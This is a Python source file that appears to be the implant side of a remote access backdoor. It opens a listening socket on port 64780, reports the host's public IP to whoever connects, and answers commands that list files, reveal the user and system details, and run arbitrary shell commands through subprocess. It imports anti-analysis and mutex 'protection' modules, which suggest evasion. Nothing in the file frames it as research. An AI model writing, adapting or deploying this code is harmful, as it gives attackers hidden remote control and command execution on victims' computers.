import json, os, subprocess, socket
from resources.misc import sysinfo
from resources.protection import proc_check, fake_mutex_code
from requests import get

port = 64780
connection = False

#if proc_check():
#    os.exit(0)

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind(('', port))
    s.listen(2)
    conn, addr = s.accept()

    while True:
        cmnd = ""
        try:
            if connection == False:
                connection = True
                ip = get('https://api.ipify.org').text
                conn.sendall(bytes(ip, encoding="utf-8"))
                cmnd = conn.recv(2048).decode('utf-8')
                if not cmnd:
                    continue

            else:
                cmnd = conn.recv(2048).decode()
                if cmnd == "reset":
                    connection = False
                    while connection == False:
                        s.listen(2)
                        conn, addr = s.accept()
                        connection = True

        except socket.error as msg:
            s.close()
            continue

        if cmnd.lower() == "kill":
            print("exiting")
            s.close()
            break
        elif cmnd.lower() == "pwd":
            result = os.path.dirname(os.path.realpath(__file__))
        elif cmnd.lower() == "user":
            result = os.getlogin()
        elif cmnd.lower() == "listdir":
            result = json.dumps(os.listdir())
        elif cmnd.lower() == "sysinfo":
            result = sysinfo()
        elif cmnd.lower().startswith("shell_"):
            try:
                cmnd = "".join(cmnd.split("_")[1:])
                print(cmnd)
                result = subprocess.getoutput(cmnd)
                print(result)
            except Exception as e:
                result = "command not found shell"
                result = bytes(result, encoding="utf-8")

            conn.sendall(bytes(result, encoding="utf-8"))
        else:
            pass
            # s.close()
            # print("command not found")

        conn.sendall(bytes(result, encoding="utf-8"))
